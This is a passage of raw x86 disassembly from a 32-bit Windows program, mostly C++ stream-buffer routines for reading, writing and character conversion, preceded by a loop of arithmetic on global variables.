  42ad53:	mov    ecx,DWORD PTR ds:0x43e05c
  42ad59:	lea    eax,[ecx+eax*1+0x3ef9]
  42ad60:	mov    DWORD PTR [ebp-0x14],0x9b9
  42ad67:	mov    ecx,eax
  42ad69:	dec    ecx
  42ad6a:	je     0x42ad9f
  42ad6c:	sub    ecx,0x12
  42ad6f:	je     0x42ad93
  42ad71:	lea    ecx,[eax+0x2e]
  42ad74:	xor    edx,edx
  42ad76:	xor    ebx,ebx
  42ad78:	sub    ecx,eax
  42ad7a:	sbb    edx,ebx
  42ad7c:	sub    ecx,esi
  42ad7e:	sbb    edx,DWORD PTR ds:0x43e09c
  42ad84:	add    ecx,0x2e
  42ad87:	adc    edx,ebx
  42ad89:	mov    esi,ecx
  42ad8b:	mov    DWORD PTR ds:0x43e09c,edx
  42ad91:	jmp    0x42ada7
  42ad93:	lea    esi,[edi+0x18]
  42ad96:	and    DWORD PTR ds:0x43e09c,0x0
  42ad9d:	jmp    0x42ada7
  42ad9f:	movzx  eax,si
  42ada2:	sub    eax,edi
  42ada4:	inc    eax
  42ada5:	mov    edi,eax
  42ada7:	lea    eax,[esi+edi*1+0x5]
  42adab:	cmp    edi,eax
  42adad:	jne    0x42add6
  42adaf:	push   0x0
  42adb1:	push   0x5c
  42adb3:	push   DWORD PTR ds:0x43e09c
  42adb9:	push   esi
  42adba:	call   0x437b80
  42adbf:	xor    ecx,ecx
  42adc1:	cmp    edi,eax
  42adc3:	jne    0x42adc9
  42adc5:	cmp    ecx,edx
  42adc7:	je     0x42add2
  42adc9:	mov    eax,edi
  42adcb:	sub    eax,esi
  42adcd:	add    eax,0x2e
  42add0:	jmp    0x42add6
  42add2:	lea    eax,[esi+edi*1+0x4]
  42add6:	mov    ecx,eax
  42add8:	xor    edx,edx
  42adda:	add    ecx,esi
  42addc:	adc    edx,DWORD PTR ds:0x43e09c
  42ade2:	add    ecx,0x32
  42ade5:	adc    edx,0x0
  42ade8:	xor    ebx,ebx
  42adea:	cmp    ecx,edi
  42adec:	jne    0x42adf6
  42adee:	cmp    edx,ebx
  42adf0:	jne    0x42adf6
  42adf2:	lea    eax,[esi+edi*1+0x1f]
  42adf6:	dec    DWORD PTR [ebp-0x14]
  42adf9:	jne    0x42ad67
  42adff:	mov    ds:0x43e05c,eax
  42ae04:	mov    DWORD PTR ds:0x43e094,edi
  42ae0a:	mov    ecx,DWORD PTR ds:0x43e058
  42ae10:	lea    eax,[ecx+eax*1+0x4]
  42ae14:	mov    ds:0x43e098,eax
  42ae19:	and    DWORD PTR ds:0x43e09c,0x0
  42ae20:	call   0x42a045
  42ae25:	mov    eax,ds:0x43e094
  42ae2a:	movzx  ecx,al
  42ae2d:	mov    edx,DWORD PTR ds:0x43e05c
  42ae33:	lea    ecx,[ecx+edx*1-0xe]
  42ae37:	mov    DWORD PTR ds:0x43e098,ecx
  42ae3d:	and    DWORD PTR ds:0x43e09c,0x0
  42ae44:	mov    ecx,DWORD PTR ds:0x43e058
  42ae4a:	lea    edx,[ecx+eax*1-0x32]
  42ae4e:	cmp    edx,0x23e
  42ae54:	jb     0x42ae61
  42ae56:	sub    ecx,eax
  42ae58:	add    ecx,0x2e
  42ae5b:	mov    DWORD PTR ds:0x43e07c,ecx
  42ae61:	call   0x4013b8
  42ae66:	xor    eax,eax
  42ae68:	mov    ecx,DWORD PTR [ebp-0xc]
  42ae6b:	mov    DWORD PTR fs:0x0,ecx
  42ae72:	pop    edi
  42ae73:	pop    esi
  42ae74:	pop    ebx
  42ae75:	leave  
  42ae76:	ret    0x10
  42ae79:	push   esi
  42ae7a:	mov    esi,ecx
  42ae7c:	push   0x0
  42ae7e:	mov    DWORD PTR [esi+0x18],0xf
  42ae85:	call   0x42c231
  42ae8a:	push   0xffffffff
  42ae8c:	push   0x0
  42ae8e:	push   DWORD PTR [esp+0x10]
  42ae92:	mov    ecx,esi
  42ae94:	call   0x42ba63
  42ae99:	mov    eax,esi
  42ae9b:	pop    esi
  42ae9c:	ret    0x4
  42ae9f:	push   esi
  42aea0:	mov    esi,ecx
  42aea2:	push   0x0
  42aea4:	mov    DWORD PTR [esi+0x18],0xf
  42aeab:	call   0x42c231
  42aeb0:	push   DWORD PTR [esp+0x8]
  42aeb4:	mov    ecx,esi
  42aeb6:	call   0x42baf2
  42aebb:	mov    eax,esi
  42aebd:	pop    esi
  42aebe:	ret    0x4
  42aec1:	push   0x0
  42aec3:	push   0x1
  42aec5:	call   0x42bb7b
  42aeca:	ret    
  42aecb:	mov    eax,DWORD PTR [esi]
  42aecd:	mov    eax,DWORD PTR [eax+0x4]
  42aed0:	push   edi
  42aed1:	add    eax,esi
  42aed3:	xor    edi,edi
  42aed5:	test   BYTE PTR [eax+0x8],0x6
  42aed9:	jne    0x42aeed
  42aedb:	mov    eax,DWORD PTR [eax+0x28]
  42aede:	mov    edx,DWORD PTR [eax]
  42aee0:	mov    ecx,eax
  42aee2:	call   DWORD PTR [edx+0x2c]
  42aee5:	cmp    eax,0xffffffff
  42aee8:	jne    0x42aeed
  42aeea:	push   0x4
  42aeec:	pop    edi
  42aeed:	mov    eax,DWORD PTR [esi]
  42aeef:	mov    ecx,DWORD PTR [eax+0x4]
  42aef2:	push   0x0
  42aef4:	push   edi
  42aef5:	add    ecx,esi
  42aef7:	call   0x42af0b
  42aefc:	mov    eax,esi
  42aefe:	pop    edi
  42aeff:	ret    
  42af00:	mov    DWORD PTR [ecx],0x4391f8
  42af06:	jmp    0x42cb7b
  42af0b:	cmp    DWORD PTR [esp+0x4],0x0
  42af10:	je     0x42af23
  42af12:	mov    eax,DWORD PTR [ecx+0x8]
  42af15:	push   DWORD PTR [esp+0x8]
  42af19:	or     eax,DWORD PTR [esp+0x8]
  42af1d:	push   eax
  42af1e:	call   0x42bbc4
  42af23:	ret    0x8
  42af26:	mov    eax,0x43807c
  42af2b:	call   0x42f168
  42af30:	sub    esp,0x1c
  42af33:	push   ebx
  42af34:	push   esi
  42af35:	push   edi
  42af36:	mov    DWORD PTR [ebp-0x10],esp
  42af39:	mov    edi,DWORD PTR [ebp+0x8]
  42af3c:	xor    ebx,ebx
  42af3e:	mov    DWORD PTR [ebp-0x14],ebx
  42af41:	mov    DWORD PTR [ebp-0x18],ebx
  42af44:	mov    DWORD PTR [edi+0x4],ebx
  42af47:	mov    eax,edi
  42af49:	lea    esi,[ebp-0x28]
  42af4c:	call   0x42be7e
  42af51:	push   0x1
  42af53:	push   DWORD PTR [ebp-0x28]
  42af56:	call   0x42bc5e
  42af5b:	mov    BYTE PTR [ebp-0x24],al
  42af5e:	cmp    al,bl
  42af60:	jne    0x42af68
  42af62:	or     DWORD PTR [ebp-0x14],0xffffffff
  42af66:	jmp    0x42afb9
  42af68:	mov    DWORD PTR [ebp-0x4],ebx
  42af6b:	mov    eax,DWORD PTR [edi]
  42af6d:	mov    eax,DWORD PTR [eax+0x4]
  42af70:	mov    ecx,DWORD PTR [eax+edi*1+0x28]
  42af74:	mov    DWORD PTR [ebp-0x1c],ecx
  42af77:	call   0x42be98
  42af7c:	mov    DWORD PTR [ebp-0x14],eax
  42af7f:	or     DWORD PTR [ebp-0x20],0xffffffff
  42af83:	cmp    eax,0xffffffff
  42af86:	jne    0x42af91
  42af88:	mov    DWORD PTR [ebp-0x18],0x3
  42af8f:	jmp    0x42afb9
  42af91:	inc    DWORD PTR [edi+0x4]
  42af94:	jmp    0x42afb9
  42af96:	mov    eax,DWORD PTR [ebp+0x8]
  42af99:	mov    ecx,DWORD PTR [eax]
  42af9b:	mov    ecx,DWORD PTR [ecx+0x4]
  42af9e:	add    ecx,eax
  42afa0:	mov    eax,DWORD PTR [ecx+0x8]
  42afa3:	push   0x1
  42afa5:	or     eax,0x4
  42afa8:	push   eax
  42afa9:	call   0x42bbc4
  42afae:	mov    eax,0x42afb4
  42afb3:	ret    
  42afb4:	xor    ebx,ebx
  42afb6:	mov    edi,DWORD PTR [ebp+0x8]
  42afb9:	or     DWORD PTR [ebp-0x4],0xffffffff
  42afbd:	push   ebx
  42afbe:	push   DWORD PTR [ebp-0x18]
  42afc1:	mov    eax,DWORD PTR [edi]
  42afc3:	mov    ecx,DWORD PTR [eax+0x4]
  42afc6:	add    ecx,edi
  42afc8:	call   0x42af0b
  42afcd:	lea    eax,[ebp-0x28]
  42afd0:	call   0x42b009
  42afd5:	mov    eax,DWORD PTR [ebp-0x14]
  42afd8:	mov    ecx,DWORD PTR [ebp-0xc]
  42afdb:	mov    DWORD PTR fs:0x0,ecx
  42afe2:	pop    edi
  42afe3:	pop    esi
  42afe4:	pop    ebx
  42afe5:	leave  
  42afe6:	ret    0x4
  42afe9:	mov    eax,DWORD PTR [esi]
  42afeb:	mov    ecx,DWORD PTR [eax+0x4]
  42afee:	push   0xa
  42aff0:	add    ecx,esi
  42aff2:	call   0x42bbde
  42aff7:	push   eax
  42aff8:	push   DWORD PTR [esp+0xc]
  42affc:	push   DWORD PTR [esp+0xc]
  42b000:	push   esi
  42b001:	call   0x42bd8e
  42b006:	ret    0x8
  42b009:	mov    eax,DWORD PTR [eax]
  42b00b:	mov    ecx,DWORD PTR [eax]
  42b00d:	mov    ecx,DWORD PTR [ecx+0x4]
  42b010:	mov    eax,DWORD PTR [ecx+eax*1+0x28]
  42b014:	test   eax,eax
  42b016:	je     0x42b020
  42b018:	lea    ecx,[eax+0x4]
  42b01b:	jmp    0x42d43d
  42b020:	ret    
  42b021:	push   esi
  42b022:	mov    esi,ecx
  42b024:	push   edi
  42b025:	mov    edi,DWORD PTR [esi+0x38]
  42b028:	test   edi,edi
  42b02a:	mov    DWORD PTR [esi],0x439228
  42b030:	je     0x42b040
  42b032:	mov    ecx,edi
  42b034:	call   0x40119a
  42b039:	push   edi
  42b03a:	call   0x42e750
  42b03f:	pop    ecx
  42b040:	pop    edi
  42b041:	lea    ecx,[esi+0x4]
  42b044:	pop    esi
  42b045:	jmp    0x42d41f
  42b04a:	mov    eax,DWORD PTR [ecx+0x20]
  42b04d:	mov    eax,DWORD PTR [eax]
  42b04f:	test   eax,eax
  42b051:	je     0x42b069
  42b053:	mov    edx,DWORD PTR [ecx+0x20]
  42b056:	mov    edx,DWORD PTR [edx]
  42b058:	push   esi
  42b059:	mov    esi,DWORD PTR [ecx+0x30]
  42b05c:	mov    esi,DWORD PTR [esi]
  42b05e:	add    esi,edx
  42b060:	cmp    edx,esi
  42b062:	pop    esi
  42b063:	jae    0x42b069
  42b065:	movzx  eax,BYTE PTR [eax]
  42b068:	ret    
  42b069:	mov    eax,DWORD PTR [ecx]
  42b06b:	jmp    DWORD PTR [eax+0x10]
  42b06e:	mov    ecx,DWORD PTR [esp+0x4]
  42b072:	call   0x42be98
  42b077:	cmp    eax,0xffffffff
  42b07a:	jne    0x42b080
  42b07c:	or     eax,eax
  42b07e:	jmp    0x42b089
  42b080:	mov    ecx,DWORD PTR [esp+0x4]
  42b084:	call   0x42b04a
  42b089:	ret    0x4
  42b08c:	or     eax,0xffffffff
  42b08f:	ret    0x4
  42b092:	xor    eax,eax
  42b094:	ret    
  42b095:	or     eax,0xffffffff
  42b098:	ret    
  42b099:	push   esi
  42b09a:	mov    esi,ecx
  42b09c:	mov    eax,DWORD PTR [esi]
  42b09e:	call   DWORD PTR [eax+0x10]
  42b0a1:	cmp    eax,0xffffffff
  42b0a4:	jne    0x42b0aa
  42b0a6:	or     eax,eax
  42b0a8:	pop    esi
  42b0a9:	ret    
  42b0aa:	mov    eax,DWORD PTR [esi+0x30]
  42b0ad:	dec    DWORD PTR [eax]
  42b0af:	mov    eax,DWORD PTR [esi+0x20]
  42b0b2:	mov    ecx,DWORD PTR [eax]
  42b0b4:	lea    edx,[ecx+0x1]
  42b0b7:	mov    DWORD PTR [eax],edx
  42b0b9:	movzx  eax,BYTE PTR [ecx]
  42b0bc:	pop    esi
  42b0bd:	ret    
  42b0be:	push   ebp
  42b0bf:	mov    ebp,esp
  42b0c1:	push   ecx
  42b0c2:	and    DWORD PTR [ebp-0x4],0x0
  42b0c6:	cmp    DWORD PTR [ebp+0xc],0x0
  42b0ca:	push   edi
  42b0cb:	mov    edi,ecx
  42b0cd:	jle    0x42b12a
  42b0cf:	push   ebx
  42b0d0:	mov    ebx,DWORD PTR [ebp+0x8]
  42b0d3:	push   esi
  42b0d4:	mov    eax,DWORD PTR [edi+0x20]
  42b0d7:	mov    eax,DWORD PTR [eax]
  42b0d9:	test   eax,eax
  42b0db:	je     0x42b10d
  42b0dd:	mov    ecx,DWORD PTR [edi+0x30]
  42b0e0:	mov    esi,DWORD PTR [ecx]
  42b0e2:	test   esi,esi
  42b0e4:	jle    0x42b10d
  42b0e6:	cmp    DWORD PTR [ebp+0xc],esi
  42b0e9:	jge    0x42b0ee
  42b0eb:	mov    esi,DWORD PTR [ebp+0xc]
  42b0ee:	push   esi
  42b0ef:	push   eax
  42b0f0:	push   ebx
  42b0f1:	call   0x42da10
  42b0f6:	mov    eax,DWORD PTR [edi+0x30]
  42b0f9:	sub    DWORD PTR [eax],esi
  42b0fb:	mov    eax,DWORD PTR [edi+0x20]
  42b0fe:	add    DWORD PTR [ebp-0x4],esi
  42b101:	sub    DWORD PTR [ebp+0xc],esi
  42b104:	add    esp,0xc
  42b107:	add    ebx,esi
  42b109:	add    DWORD PTR [eax],esi
  42b10b:	jmp    0x42b122
  42b10d:	mov    eax,DWORD PTR [edi]
  42b10f:	mov    ecx,edi
  42b111:	call   DWORD PTR [eax+0x14]
  42b114:	cmp    eax,0xffffffff
  42b117:	je     0x42b128
  42b119:	mov    BYTE PTR [ebx],al
  42b11b:	inc    ebx
  42b11c:	inc    DWORD PTR [ebp-0x4]
  42b11f:	dec    DWORD PTR [ebp+0xc]
  42b122:	cmp    DWORD PTR [ebp+0xc],0x0
  42b126:	jg     0x42b0d4
  42b128:	pop    esi
  42b129:	pop    ebx
  42b12a:	mov    eax,DWORD PTR [ebp-0x4]
  42b12d:	pop    edi
  42b12e:	leave  
  42b12f:	ret    0x8
  42b132:	push   ebp
  42b133:	mov    ebp,esp
  42b135:	push   ecx
  42b136:	and    DWORD PTR [ebp-0x4],0x0
  42b13a:	cmp    DWORD PTR [ebp+0xc],0x0
  42b13e:	push   edi
  42b13f:	mov    edi,ecx
  42b141:	jle    0x42b1a0
  42b143:	push   ebx
  42b144:	mov    ebx,DWORD PTR [ebp+0x8]
  42b147:	push   esi
  42b148:	mov    eax,DWORD PTR [edi+0x24]
  42b14b:	mov    eax,DWORD PTR [eax]
  42b14d:	test   eax,eax
  42b14f:	je     0x42b181
  42b151:	mov    ecx,DWORD PTR [edi+0x34]
  42b154:	mov    esi,DWORD PTR [ecx]
  42b156:	test   esi,esi
  42b158:	jle    0x42b181
  42b15a:	cmp    DWORD PTR [ebp+0xc],esi
  42b15d:	jge    0x42b162
  42b15f:	mov    esi,DWORD PTR [ebp+0xc]
  42b162:	push   esi
  42b163:	push   ebx
  42b164:	push   eax
  42b165:	call   0x42da10
  42b16a:	mov    eax,DWORD PTR [edi+0x34]
  42b16d:	sub    DWORD PTR [eax],esi
  42b16f:	mov    eax,DWORD PTR [edi+0x24]
  42b172:	add    DWORD PTR [ebp-0x4],esi
  42b175:	sub    DWORD PTR [ebp+0xc],esi
  42b178:	add    esp,0xc
  42b17b:	add    ebx,esi
  42b17d:	add    DWORD PTR [eax],esi
  42b17f:	jmp    0x42b198
  42b181:	movzx  ecx,BYTE PTR [ebx]
  42b184:	mov    eax,DWORD PTR [edi]
  42b186:	push   ecx
  42b187:	mov    ecx,edi
  42b189:	call   DWORD PTR [eax+0x4]
  42b18c:	cmp    eax,0xffffffff
  42b18f:	je     0x42b19e
  42b191:	inc    ebx
  42b192:	inc    DWORD PTR [ebp-0x4]
  42b195:	dec    DWORD PTR [ebp+0xc]
  42b198:	cmp    DWORD PTR [ebp+0xc],0x0
  42b19c:	jg     0x42b148
  42b19e:	pop    esi
  42b19f:	pop    ebx
  42b1a0:	mov    eax,DWORD PTR [ebp-0x4]
  42b1a3:	pop    edi
  42b1a4:	leave  
  42b1a5:	ret    0x8
  42b1a8:	mov    eax,DWORD PTR [esp+0x4]
  42b1ac:	mov    ecx,DWORD PTR ds:0x439178
  42b1b2:	mov    DWORD PTR [eax],ecx
  42b1b4:	mov    ecx,DWORD PTR ds:0x43f840
  42b1ba:	mov    DWORD PTR [eax+0x8],ecx
  42b1bd:	mov    ecx,DWORD PTR ds:0x43f844
  42b1c3:	mov    DWORD PTR [eax+0xc],ecx
  42b1c6:	mov    ecx,DWORD PTR ds:0x464ea4
  42b1cc:	mov    DWORD PTR [eax+0x10],ecx
  42b1cf:	ret    0x10
  42b1d2:	mov    eax,DWORD PTR [esp+0x4]
  42b1d6:	mov    ecx,DWORD PTR ds:0x439178
  42b1dc:	mov    DWORD PTR [eax],ecx
  42b1de:	mov    ecx,DWORD PTR ds:0x43f840
  42b1e4:	mov    DWORD PTR [eax+0x8],ecx
  42b1e7:	mov    ecx,DWORD PTR ds:0x43f844
  42b1ed:	mov    DWORD PTR [eax+0xc],ecx
  42b1f0:	mov    ecx,DWORD PTR ds:0x464ea4
  42b1f6:	mov    DWORD PTR [eax+0x10],ecx
  42b1f9:	ret    0x20
  42b1fc:	mov    eax,ecx
  42b1fe:	ret    0x8
  42b201:	ret    0x4
  42b204:	push   ebp
  42b205:	mov    ebp,esp
  42b207:	push   ecx
  42b208:	push   ebx
  42b209:	push   esi
  42b20a:	mov    esi,eax
  42b20c:	xor    eax,eax
  42b20e:	cmp    DWORD PTR [ebp+0x10],eax
  42b211:	mov    DWORD PTR [ebp-0x4],eax
  42b214:	je     0x42b223
  42b216:	mov    DWORD PTR [edi],0x43b4bc
  42b21c:	mov    DWORD PTR [edi+0x64],0x4391f8
  42b223:	push   eax
  42b224:	push   eax
  42b225:	push   eax
  42b226:	lea    ebx,[edi+0x8]
  42b229:	push   ebx
  42b22a:	mov    ecx,edi
  42b22c:	call   0x42bc13
  42b231:	mov    eax,DWORD PTR [edi]
  42b233:	mov    eax,DWORD PTR [eax+0x4]
  42b236:	push   0x0
  42b238:	mov    ecx,ebx
  42b23a:	mov    DWORD PTR [edi+eax*1],0x43b4c4
  42b241:	call   0x42befc
  42b246:	push   DWORD PTR [ebp+0xc]
  42b249:	or     esi,0x1
  42b24c:	push   esi
  42b24d:	push   DWORD PTR [ebp+0x8]
  42b250:	mov    esi,ebx
  42b252:	call   0x42bf21
  42b257:	test   eax,eax
  42b259:	pop    esi
  42b25a:	pop    ebx
  42b25b:	jne    0x42b272
  42b25d:	mov    eax,DWORD PTR [edi]
  42b25f:	mov    ecx,DWORD PTR [eax+0x4]
  42b262:	add    ecx,edi
  42b264:	mov    eax,DWORD PTR [ecx+0x8]
  42b267:	push   0x0
  42b269:	or     eax,0x2
  42b26c:	push   eax
  42b26d:	call   0x42bbc4
  42b272:	mov    eax,edi
  42b274:	leave  
  42b275:	ret    0xc
  42b278:	mov    eax,DWORD PTR [ecx-0x64]
  42b27b:	mov    eax,DWORD PTR [eax+0x4]
  42b27e:	push   esi
  42b27f:	lea    esi,[ecx-0x5c]
  42b282:	mov    DWORD PTR [eax+ecx*1-0x64],0x43b4c4
  42b28a:	mov    ecx,esi
  42b28c:	call   0x42b2c3
  42b291:	mov    eax,DWORD PTR [esi-0x8]
  42b294:	mov    eax,DWORD PTR [eax+0x4]
  42b297:	mov    DWORD PTR [eax+esi*1-0x8],0x4392c4
  42b29f:	pop    esi
  42b2a0:	ret    
  42b2a1:	lea    ecx,[esi+0x8]
  42b2a4:	call   0x42bf7a
  42b2a9:	test   eax,eax
  42b2ab:	jne    0x42b2c2
  42b2ad:	mov    eax,DWORD PTR [esi]
  42b2af:	mov    ecx,DWORD PTR [eax+0x4]
  42b2b2:	add    ecx,esi
  42b2b4:	mov    eax,DWORD PTR [ecx+0x8]
  42b2b7:	push   0x0
  42b2b9:	or     eax,0x2
  42b2bc:	push   eax
  42b2bd:	call   0x42bbc4
  42b2c2:	ret    
  42b2c3:	push   esi
  42b2c4:	mov    esi,ecx
  42b2c6:	cmp    BYTE PTR [esi+0x54],0x0
  42b2ca:	mov    DWORD PTR [esi],0x439260
  42b2d0:	je     0x42b2d7
  42b2d2:	call   0x42bf7a
  42b2d7:	mov    ecx,DWORD PTR [esi+0x48]
  42b2da:	test   ecx,ecx
  42b2dc:	je     0x42b2e5
  42b2de:	push   0x1
  42b2e0:	call   0x42b9a2
  42b2e5:	mov    ecx,esi
  42b2e7:	pop    esi
  42b2e8:	jmp    0x42b021
  42b2ed:	push   ebp
  42b2ee:	mov    ebp,esp
  42b2f0:	sub    esp,0x28
  42b2f3:	push   ebx
  42b2f4:	mov    ebx,DWORD PTR [ebp+0x8]
  42b2f7:	cmp    ebx,0xffffffff
  42b2fa:	push   esi
  42b2fb:	mov    esi,ecx
  42b2fd:	jne    0x42b306
  42b2ff:	xor    eax,eax
  42b301:	jmp    0x42b44b
  42b306:	mov    ecx,DWORD PTR [esi+0x24]
  42b309:	push   edi
  42b30a:	xor    edi,edi
  42b30c:	cmp    DWORD PTR [ecx],edi
  42b30e:	je     0x42b32d
  42b310:	mov    eax,DWORD PTR [esi+0x34]
  42b313:	mov    ecx,DWORD PTR [ecx]
  42b315:	mov    edx,DWORD PTR [eax]
  42b317:	add    edx,ecx
  42b319:	cmp    ecx,edx
  42b31b:	jae    0x42b32d
  42b31d:	dec    DWORD PTR [eax]
  42b31f:	mov    esi,DWORD PTR [esi+0x24]
  42b322:	mov    eax,DWORD PTR [esi]
  42b324:	lea    ecx,[eax+0x1]
  42b327:	mov    DWORD PTR [esi],ecx
  42b329:	mov    BYTE PTR [eax],bl
  42b32b:	jmp    0x42b34e
  42b32d:	mov    eax,DWORD PTR [esi+0x58]
  42b330:	cmp    eax,edi
  42b332:	je     0x42b447
  42b338:	cmp    DWORD PTR [esi+0x3c],edi
  42b33b:	jne    0x42b355
  42b33d:	push   eax
  42b33e:	mov    al,bl
  42b340:	call   0x4267d7
  42b345:	test   al,al
  42b347:	pop    ecx
  42b348:	je     0x42b447
  42b34e:	mov    eax,ebx
  42b350:	jmp    0x42b44a
  42b355:	mov    ecx,DWORD PTR [esi+0x48]
  42b358:	push   0xffffffff
  42b35a:	push   edi
  42b35b:	mov    BYTE PTR [ebp-0x1],bl
  42b35e:	call   0x42bb0f
  42b363:	push   edi
  42b364:	push   0x8
  42b366:	lea    ecx,[ebp-0x28]
  42b369:	call   0x42b9dd
  42b36e:	cmp    DWORD PTR [ebp-0x10],0x10
  42b372:	mov    eax,DWORD PTR [ebp-0x24]
  42b375:	jae    0x42b408
  42b37b:	lea    eax,[ebp-0x24]
  42b37e:	mov    edx,eax
  42b380:	mov    ecx,DWORD PTR [esi+0x3c]
  42b383:	mov    edi,DWORD PTR [ecx]
  42b385:	lea    ebx,[ebp-0x8]
  42b388:	push   ebx
  42b389:	mov    ebx,DWORD PTR [ebp-0x14]
  42b38c:	add    eax,ebx
  42b38e:	push   eax
  42b38f:	push   edx
  42b390:	lea    eax,[ebp-0xc]
  42b393:	push   eax
  42b394:	lea    eax,[ebp+0x0]
  42b397:	push   eax
  42b398:	lea    eax,[ebp-0x1]
  42b39b:	push   eax
  42b39c:	lea    eax,[esi+0x50]
  42b39f:	push   eax
  42b3a0:	call   DWORD PTR [edi+0x14]
  42b3a3:	xor    ebx,ebx
  42b3a5:	cmp    eax,ebx
  42b3a7:	jl     0x42b43c
  42b3ad:	cmp    eax,0x1
  42b3b0:	jg     0x42b410
  42b3b2:	cmp    DWORD PTR [ebp-0x10],0x10
  42b3b6:	mov    eax,DWORD PTR [ebp-0x24]
  42b3b9:	jae    0x42b3be
  42b3bb:	lea    eax,[ebp-0x24]
  42b3be:	mov    edi,DWORD PTR [ebp-0x8]
  42b3c1:	sub    edi,eax
  42b3c3:	je     0x42b3e4
  42b3c5:	cmp    DWORD PTR [ebp-0x10],0x10
  42b3c9:	mov    eax,DWORD PTR [ebp-0x24]
  42b3cc:	jae    0x42b3d1
  42b3ce:	lea    eax,[ebp-0x24]
  42b3d1:	push   DWORD PTR [esi+0x58]
  42b3d4:	push   edi
  42b3d5:	push   0x1
  42b3d7:	push   eax
  42b3d8:	call   0x42e85c
  42b3dd:	add    esp,0x10
  42b3e0:	cmp    edi,eax
  42b3e2:	jne    0x42b42a
  42b3e4:	lea    eax,[ebp-0x1]
  42b3e7:	cmp    DWORD PTR [ebp-0xc],eax
  42b3ea:	mov    BYTE PTR [esi+0x4c],0x1
  42b3ee:	jne    0x42b425
  42b3f0:	cmp    edi,ebx
  42b3f2:	jne    0x42b36e
  42b3f8:	push   ebx
  42b3f9:	push   0x8
  42b3fb:	lea    ecx,[ebp-0x28]
  42b3fe:	call   0x42ba03
  42b403:	jmp    0x42b36e
  42b408:	mov    edx,DWORD PTR [ebp-0x24]
  42b40b:	jmp    0x42b380
  42b410:	cmp    eax,0x3
  42b413:	jne    0x42b43c
  42b415:	push   DWORD PTR [esi+0x58]
  42b418:	mov    al,BYTE PTR [ebp-0x1]
  42b41b:	call   0x4267d7
  42b420:	test   al,al
  42b422:	pop    ecx
  42b423:	je     0x42b42a
  42b425:	mov    esi,DWORD PTR [ebp+0x8]
  42b428:	jmp    0x42b42d
  42b42a:	or     esi,0xffffffff
  42b42d:	push   ebx
  42b42e:	push   0x1
  42b430:	lea    ecx,[ebp-0x28]
  42b433:	call   0x42bb7b
  42b438:	mov    eax,esi
  42b43a:	jmp    0x42b44a
  42b43c:	push   ebx
  42b43d:	push   0x1
  42b43f:	lea    ecx,[ebp-0x28]
  42b442:	call   0x42bb7b
  42b447:	or     eax,0xffffffff
  42b44a:	pop    edi
  42b44b:	pop    esi
  42b44c:	pop    ebx
  42b44d:	leave  
  42b44e:	ret    0x4
  42b451:	push   ebp
  42b452:	mov    ebp,esp
  42b454:	push   ebx
  42b455:	mov    ebx,DWORD PTR [ebp+0x8]
  42b458:	push   esi
  42b459:	mov    esi,ecx
  42b45b:	mov    eax,DWORD PTR [esi+0x20]
  42b45e:	mov    eax,DWORD PTR [eax]
  42b460:	test   eax,eax
  42b462:	je     0x42b48d
  42b464:	mov    ecx,DWORD PTR [esi+0x10]
  42b467:	cmp    DWORD PTR [ecx],eax
  42b469:	jae    0x42b48d
  42b46b:	cmp    ebx,0xffffffff
  42b46e:	je     0x42b478
  42b470:	movzx  eax,BYTE PTR [eax-0x1]
  42b474:	cmp    eax,ebx
  42b476:	jne    0x42b48d
  42b478:	mov    eax,DWORD PTR [esi+0x30]
  42b47b:	inc    DWORD PTR [eax]
  42b47d:	mov    esi,DWORD PTR [esi+0x20]
  42b480:	dec    DWORD PTR [esi]
  42b482:	mov    eax,ebx
  42b484:	inc    eax
  42b485:	neg    eax
  42b487:	sbb    eax,eax
  42b489:	and    eax,ebx
  42b48b:	jmp    0x42b4db
  42b48d:	mov    eax,DWORD PTR [esi+0x58]
  42b490:	test   eax,eax
  42b492:	je     0x42b4d8
  42b494:	cmp    ebx,0xffffffff
  42b497:	je     0x42b4d8
  42b499:	cmp    DWORD PTR [esi+0x3c],0x0
  42b49d:	jne    0x42b4b4
  42b49f:	push   eax
  42b4a0:	lea    eax,[ebp+0xb]
  42b4a3:	mov    BYTE PTR [ebp+0xb],bl
  42b4a6:	call   0x4267f1
  42b4ab:	test   al,al
  42b4ad:	pop    ecx
  42b4ae:	je     0x42b4b4
  42b4b0:	mov    eax,ebx
  42b4b2:	jmp    0x42b4db
  42b4b4:	mov    ecx,DWORD PTR [esi+0x20]
  42b4b7:	lea    eax,[esi+0x44]
  42b4ba:	cmp    DWORD PTR [ecx],eax
  42b4bc:	je     0x42b4d8
  42b4be:	mov    ecx,DWORD PTR [esi+0x10]
  42b4c1:	mov    BYTE PTR [eax],bl
  42b4c3:	mov    DWORD PTR [ecx],eax
  42b4c5:	mov    ecx,DWORD PTR [esi+0x20]
  42b4c8:	mov    DWORD PTR [ecx],eax
  42b4ca:	mov    ecx,esi
  42b4cc:	sub    ecx,eax
  42b4ce:	mov    eax,DWORD PTR [esi+0x30]
  42b4d1:	add    ecx,0x45
  42b4d4:	mov    DWORD PTR [eax],ecx
  42b4d6:	jmp    0x42b4b0
  42b4d8:	or     eax,0xffffffff
  42b4db:	pop    esi
  42b4dc:	pop    ebx
  42b4dd:	pop    ebp
  42b4de:	ret    0x4
  42b4e1:	push   esi
  42b4e2:	mov    esi,ecx
  42b4e4:	mov    eax,DWORD PTR [esi+0x20]
  42b4e7:	mov    ecx,DWORD PTR [eax]
  42b4e9:	test   ecx,ecx
  42b4eb:	je     0x42b4ff
  42b4ed:	mov    edx,DWORD PTR [esi+0x30]
  42b4f0:	mov    eax,DWORD PTR [eax]
  42b4f2:	mov    edx,DWORD PTR [edx]
  42b4f4:	add    edx,eax
  42b4f6:	cmp    eax,edx
  42b4f8:	jae    0x42b4ff
  42b4fa:	movzx  eax,BYTE PTR [ecx]
  42b4fd:	pop    esi
  42b4fe:	ret    
  42b4ff:	mov    eax,DWORD PTR [esi]
  42b501:	push   edi
  42b502:	mov    ecx,esi
  42b504:	call   DWORD PTR [eax+0x14]
  42b507:	mov    edi,eax
  42b509:	or     eax,0xffffffff
  42b50c:	cmp    edi,eax
  42b50e:	je     0x42b51a
  42b510:	mov    eax,DWORD PTR [esi]
  42b512:	push   edi
  42b513:	mov    ecx,esi
  42b515:	call   DWORD PTR [eax+0x8]
  42b518:	mov    eax,edi
  42b51a:	pop    edi
  42b51b:	pop    esi
  42b51c:	ret    
  42b51d:	push   ebp
  42b51e:	mov    ebp,esp
  42b520:	sub    esp,0x10
  42b523:	push   esi
  42b524:	mov    esi,ecx
  42b526:	mov    ecx,DWORD PTR [esi+0x20]
  42b529:	xor    edx,edx
  42b52b:	cmp    DWORD PTR [ecx],edx
  42b52d:	push   edi
